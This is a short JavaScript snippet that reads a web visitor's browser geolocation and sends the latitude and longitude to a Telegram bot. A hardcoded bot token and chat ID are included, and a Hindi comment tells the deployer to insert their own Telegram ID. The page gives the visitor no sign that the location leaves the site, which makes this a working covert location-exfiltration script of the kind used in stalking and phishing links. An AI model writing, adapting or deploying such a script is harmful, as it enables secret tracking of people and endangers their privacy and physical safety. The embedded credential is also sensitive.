function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendToTelegram);
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}

function sendToTelegram(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const message = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

  const token = "7847229114:AAHGiStrH3Q8CjCMLso-YG_9nqb0jW_-Kkg";
  const chatId = 2142701628; // Yahan apna Telegram numeric ID daalo

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}